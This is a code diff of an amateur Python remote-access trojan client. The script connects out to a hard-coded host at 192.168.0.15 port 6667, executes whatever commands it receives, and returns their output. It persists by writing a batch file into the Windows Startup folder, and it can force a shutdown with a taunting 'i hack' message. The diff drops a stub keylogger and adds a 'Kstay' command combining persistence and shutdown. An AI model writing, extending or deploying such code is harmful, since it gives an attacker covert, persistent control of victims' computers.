@@ -17,12 +17,6 @@ USER = getuser()
 
 #used PATHS:
 temp_path = r'C:\Users\%s\AppData\Local\Temp\_TMP995858_atmpk' % USER
-#bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER
-#file_path = path.dirname(path.realpath(__file__))
-
-def keyLog():
-    #work in progress
-    pass
 
 def kill():
     os.system("msg %username% your system will be shutdown because i hack then :) lol")
@@ -42,15 +36,12 @@ def clone():
 
 def bat_create(file_path=""):
     if(file_path == ""):
-        #file_path = path.dirname(path.realpath(__file__))
         file_path = temp_path
         bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER
     with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
         bat_file.write(r'start /b %s\\clt.exe' % file_path)
         msg = "[+] .bat file created!"
         conn.send(msg.encode("utf-8"))
-        #src = Path(file_path)
-        #dstn = Path(temp_path)
 
 conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 conn.connect(("192.168.0.15",6667))
@@ -69,11 +60,13 @@ while True:
     if cmd == "stay":
         bat_create()
         clone()
-        #kill()
-    if cmd == "Pkey":
-        keyLog()
-
-
+        #re-start the server
+    if cmd == "Kstay":
+        bat_create()
+        clone()
+        kill()
+        #re-start the server
+# Kstay shutdown the sistem. stay dont shutdown
     os.system(cmd)
     output = subprocess.getoutput(cmd)
     conn.send(output.encode('utf-8'))
